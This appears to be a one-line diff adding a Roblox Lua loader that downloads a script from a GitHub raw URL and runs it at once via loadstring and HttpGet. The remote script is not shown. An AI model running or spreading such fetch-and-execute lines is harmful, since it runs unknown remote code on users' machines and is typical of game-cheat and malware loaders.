@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/apple-ipad-original-spam0-13rppg4bktbl72.lua"))()
